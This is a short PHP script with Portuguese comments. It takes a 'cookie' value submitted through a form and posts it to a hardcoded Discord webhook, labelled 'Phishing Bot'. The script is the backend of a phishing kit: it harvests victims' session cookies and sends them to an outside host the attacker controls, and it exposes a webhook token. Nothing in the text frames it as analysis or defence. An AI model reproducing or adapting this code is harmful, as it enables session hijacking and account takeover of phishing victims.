<?php
// Dados do formulário
$cookie = $_POST['cookie'];

// Envie os dados para o seu Discord
$webhookurl = 'https://discord.com/api/webhooks/1040678839396872322/TIl24vk7NiW4Fz3zACaKchZhtMc8ien3KjI9ha9EU1dTBeKIDH18H3Fgx3uStpAkG5Ud'; // Substitua pelo seu webhook do Discord

$data = array('username' => 'Phishing Bot', 'content' => "Cookie: $cookie");

$ch = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);
?>
